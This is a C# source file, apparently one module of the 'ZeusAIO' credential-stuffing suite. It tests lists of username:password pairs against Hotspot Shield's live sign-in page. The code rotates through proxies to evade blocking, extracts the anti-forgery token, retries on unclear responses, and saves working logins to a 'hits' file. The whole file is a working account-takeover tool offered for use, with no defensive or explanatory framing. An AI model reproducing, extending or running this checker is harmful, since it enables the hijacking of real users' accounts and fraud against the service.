using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace Hotspotshield
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.AllowAutoRedirect = true;
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            string Getlogin = httpRequest.Get("https://account.hotspotshield.com/sign-in/").ToString();
                            string access_token = Check.Parse(Getlogin, "vxsftok: '", "'");
                            string str = "login=" + s[0] + "&pwd=" + s[1] + "&remember=0&ajax=true&vxsftok=" + access_token;

                            string strResponse = httpRequest.Post("https://account.hotspotshield.com/sign-in", str, "application/x-www-form-urlencoded").ToString();
                            {
                                if (strResponse.Contains("result\":0"))
                                {
                                    //bads
                                }
                                else if (strResponse.Contains("result\":1")) //hit
                                {
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - HOTSPOTSHIELD] " + s[0] + ":" + s[1], Color.Green);
                                    }
                                    Export.AsResult("/Hotspotshield_hits", s[0] + ":" + s[1]);
                                    return false;
                                }
                                else
                                {
                                    ZeusAIO.mainmenu.realretries++;
                                    goto Retry;
                                }
                            }
                            break;
                        }
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}

